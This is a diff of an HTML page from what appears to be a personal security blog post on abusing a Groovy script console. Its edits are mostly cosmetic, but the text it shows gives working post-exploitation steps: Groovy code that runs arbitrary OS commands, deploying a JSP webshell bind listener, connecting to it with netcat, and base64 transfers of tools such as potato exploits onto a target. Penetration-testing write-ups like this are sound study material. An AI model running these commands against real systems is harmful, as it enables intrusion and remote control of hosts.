@@ -14,8 +14,6 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta name="google-site-verification" content="-1CTZCLTxditzGFr67zWpI5-6H8z7TlZt_LuEkJaIKE" />
-
   <meta property="og:title" content="Weaponizing the Groovy script console: Bindshells &amp; base64 tool transfers"/>
   <meta property="og:site_name" content="vipa0z"/>
 
@@ -33,6 +31,7 @@
   <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
   <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
   <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
@@ -107,12 +106,6 @@
 			</a>
 		  </li>
 		  
-		  <li>
-			<a target="_blank" rel="noopener" href="https://magdy3660.gitbook.io/field-manualx/" title="Read My Manual">
-			  <i class="fa fa-file"></i>Read My Manual
-			</a>
-		  </li>
-		  
 		</ul>
       </div>
     </div> <!-- container -->
@@ -165,9 +158,9 @@
 <li>Clean up and document detection artifacts.</li>
 </ol>
 <h3 id="Simple-OS-commands-POC"><a href="#Simple-OS-commands-POC" class="headerlink" title="Simple OS commands POC:"></a>Simple OS commands POC:</h3><p>POC script for running simple commands such as  <code>pwd, ls, dir, cd</code>  and trying to identify where the web root might be located:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux: pwd, ls -la, id, whoami, env</span><br><span class="line"></span><br><span class="line">Windows: dir, whoami, echo %USERPROFILE%</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux: pwd, ls -la, id, whoami, env</span><br><span class="line"></span><br><span class="line">Windows: dir, whoami, echo %USERPROFILE%</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> cmd=<span class="string">&quot;YOURCOMMAND-dir&quot;</span></span><br><span class="line"><span class="keyword">def</span> sout = <span class="keyword">new</span> StringBuilder(), serr = <span class="keyword">new</span> StringBuilder()</span><br><span class="line"><span class="keyword">def</span> proc = cmd.execute()</span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line">proc.waitForOrKill(<span class="number">1000</span>)</span><br><span class="line">println <span class="string">&quot;out&gt; $sout err&gt; $serr&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> cmd=<span class="string">&quot;YOURCOMMAND-dir&quot;</span></span><br><span class="line"><span class="keyword">def</span> sout = <span class="keyword">new</span> StringBuilder(), serr = <span class="keyword">new</span> StringBuilder()</span><br><span class="line"><span class="keyword">def</span> proc = cmd.execute()</span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line">proc.waitForOrKill(<span class="number">1000</span>)</span><br><span class="line">println <span class="string">&quot;out&gt; $sout err&gt; $serr&quot;</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="1-Finding-stable-writable-locations"><a href="#1-Finding-stable-writable-locations" class="headerlink" title="1) Finding stable, writable locations"></a>1) Finding stable, writable locations</h3><p>From the console, run simple listing commands to map the filesystem and locate likely writable paths.</p>
 <p>Typical candidate locations:</p>
@@ -178,7 +171,7 @@
 <p>Use this link to access the code. Paste it into your Groovy console after updating the output path to match your Tomcat webroot.</p>
 <p>Hit save, then to enable the listener, browse to your webshell at: <a target="_blank" rel="noopener" href="http://site/threaded.jsp">http://site/threaded.jsp</a></p>
 <p>Connect to the bind shell via netcat:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">example 1:</span><br><span class="line">rlwrap -cAr nc -nv HOST-IP 3001</span><br><span class="line"></span><br><span class="line">example 2:</span><br><span class="line">rlwrap -cAr nc -nv 172.16.30.10 3001</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">example 1:</span><br><span class="line">rlwrap -cAr nc -nv HOST-IP 3001</span><br><span class="line"></span><br><span class="line">example 2:</span><br><span class="line">rlwrap -cAr nc -nv 172.16.30.10 3001</span><br></pre></td></tr></table></figure>
 
 <p>Tips:</p>
 <ul>
@@ -190,12 +183,12 @@
 <p>note: this will not work if your base64 is more than 6000 in length, you can use the chunking method below to transfer large base64 strings.</p>
 <p>for smaller sized tools (eg: netcat, potato exploits..etc):</p>
 <p>base64 encode the tool and copy to clipboard:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 --wrap=0 tool.exe | xclip -selection clipboard -i</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base64 --wrap=0 tool.exe | xclip -selection clipboard -i</span><br></pre></td></tr></table></figure>
 <p>paste the base64 into the console</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> b64 = <span class="string">&#x27;&#x27;&#x27;&lt;LONG BASE64 STRING&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> dest = Paths.get(<span class="string">&quot;C:/DESTPATH/xyz&quot;</span>)</span><br><span class="line"><span class="type">byte</span>[] bytes = Base64.getDecoder().decode(b64)</span><br><span class="line">Files.write(dest, bytes)</span><br><span class="line">println <span class="string">&quot;Wrote $&#123;bytes.length&#125; bytes to $&#123;dest&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> b64 = <span class="string">&#x27;&#x27;&#x27;&lt;LONG BASE64 STRING&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> dest = Paths.get(<span class="string">&quot;C:/DESTPATH/xyz&quot;</span>)</span><br><span class="line"><span class="type">byte</span>[] bytes = Base64.getDecoder().decode(b64)</span><br><span class="line">Files.write(dest, bytes)</span><br><span class="line">println <span class="string">&quot;Wrote $&#123;bytes.length&#125; bytes to $&#123;dest&#125;&quot;</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="For-Larger-Binaries"><a href="#For-Larger-Binaries" class="headerlink" title="For Larger Binaries"></a>For Larger Binaries</h4><p>I put together a script that chunks your tools into smaller base64 files (6000 chars per chunk by default), so you can paste them into the console and reassemble them with Groovy.<br>Script: <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/vipa0z/Groovy-bind-shell/refs/heads/main/tool_chunker.py">https://raw.githubusercontent.com/vipa0z/Groovy-bind-shell/refs/heads/main/tool_chunker.py</a><br>run:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 tool_chunker.py yourtool.exe -o &lt;output_dir&gt; -s 6000</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 tool_chunker.py yourtool.exe -o &lt;output_dir&gt; -s 6000</span><br></pre></td></tr></table></figure>
 <p><strong>Options:</strong></p>
 <ul>
 <li><code>-s</code>: chunk size (default 6000)</li>
@@ -204,7 +197,7 @@
 </ul>
 <p>The script outputs numbered chunks (<code>part1</code>, <code>part2</code>, etc.) and shows you what to do next.</p>
 <p><strong>Example:</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 tool_chunker.py -s 6000 XecretsEz -o xcretsez</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 tool_chunker.py -s 6000 XecretsEz -o xcretsez</span><br></pre></td></tr></table></figure>
 <img width="819" height="261" alt="image" src="https://github.com/user-attachments/assets/f5e1bf7f-6916-4ca2-bdf5-de0d7caa424b" />
 
 <p>Steps:</p>
@@ -241,7 +234,8 @@
 
     
     
-    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    <a href="/2025/11/20/SSRF-exploitation-cheathseet/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
@@ -345,14 +339,6 @@
 <script src="/js/search.js"></script> 
 
 
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-<script type="text/javascript">
-(function($){
-  $('.fancybox').fancybox();
-})(jQuery);
-</script>
-
 
 
    <script type="text/javascript">      
@@ -364,5 +350,6 @@
      searchFunc(path, 'local-search-input', 'local-search-result');
    </script>
 
+  <script src="/js/theme-toggle.js"></script>
 </body>
    </html>
